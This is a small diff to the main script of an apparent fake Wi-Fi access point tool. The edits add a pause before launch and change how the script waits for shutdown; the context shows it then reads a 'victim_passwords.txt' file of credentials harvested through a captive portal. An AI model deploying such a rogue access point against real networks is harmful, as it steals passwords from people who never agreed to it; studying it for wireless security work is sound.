@@ -22,6 +22,7 @@ if __name__ == "__main__":
             pretty(f'\nNetwork interface selected: {interface}\n')
         else:
             print(f'No such network interface: {sys.argv[1]}')
+            
     if len(sys.argv) >= 3:
         ssid = sys.argv[2]
         pretty(f'\nNetwork name(SSID): {ssid}\n')
@@ -45,10 +46,11 @@ if __name__ == "__main__":
             f'\n===============================================================\n'
     pretty(title)
     pretty('Press Enter to start the Fake Access Point!')
+    input("")
     fake_ap = FakeAP(interface_name=interface, ssid=ssid)  # Construct the (fake) wireless access point
     fake_ap.start()  # Start the Fake AP!
 
-    fake_ap.ap.join()  # Wait for the AP to shut down
+    fake_ap.wait_to_finish()  # Wait for the AP to shut down
 
     with open('victim_passwords.txt', 'r') as captive_port_results:
 
